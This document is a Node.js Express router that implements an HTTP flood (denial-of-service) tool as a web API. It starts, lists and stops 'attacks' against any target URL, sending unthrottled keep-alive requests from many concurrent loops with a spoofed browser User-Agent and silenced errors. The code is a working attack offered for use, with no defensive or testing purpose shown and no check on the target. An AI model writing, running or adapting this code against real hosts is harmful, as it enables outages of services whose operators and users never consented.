'use strict';

const express = require('express');
const router = express.Router();
const logger = require('../middleware/logger');
const http = require('http');
const https = require('https');
const { URL } = require('url');

let activeAttacks = {};

router.get('/', (req, res) => {
  res.json({ attacks: Object.keys(activeAttacks) });
});

router.post('/', (req, res) => {
  const { target, method, layer, threads, rps, duration, httpMethod, port } = req.body;

  logger.info(`Attack initiated: ${method} on ${target}`);
  logger.info(`Configuration: ${threads} threads, ${rps} req/s, ${duration}s`);

  const attackId = Date.now().toString();
  activeAttacks[attackId] = { target, method, startTime: Date.now() };

  // Start real attack
  startRealAttack(target, method, layer, threads, rps, duration, httpMethod, port, attackId);

  res.json({ status: 'started', id: attackId });
});

function startRealAttack(target, method, layer, threads, rps, duration, httpMethod, port, attackId) {
  const protocol = target.startsWith('https') ? https : http;
  const targetUrl = target.startsWith('http') ? target : `http://${target}`;

  let requestCount = 0;

  const sendRequest = () => {
    if (!activeAttacks[attackId]) {
      logger.info(`Attack ${attackId} stopped`);
      return;
    }

    try {
      const url = new URL(targetUrl);
      const options = {
        hostname: url.hostname,
        port: url.port || (protocol === https ? 443 : 80),
        path: url.pathname || '/',
        method: httpMethod || 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': '*/*',
          'Connection': 'keep-alive'
        }
      };

      const req = protocol.request(options, (res) => {
        requestCount++;
        res.on('data', () => {});
        res.on('end', () => {});
      });

      req.on('error', (err) => {
        // Silent error handling
      });

      req.setTimeout(3000, () => {
        req.destroy();
      });

      req.end();
    } catch (err) {
      // Error handling
    }

    // Send next request immediately (no rate limiting)
    setImmediate(sendRequest);
  };

  // Start multiple threads
  for (let i = 0; i < threads; i++) {
    setImmediate(sendRequest);
  }
}

router.delete('/:id', (req, res) => {
  const { id } = req.params;
  if (activeAttacks[id]) {
    delete activeAttacks[id];
    logger.info(`Attack ${id} stopped`);
    res.json({ status: 'stopped' });
  } else {
    res.status(404).json({ error: 'Attack not found' });
  }
});

module.exports = router;
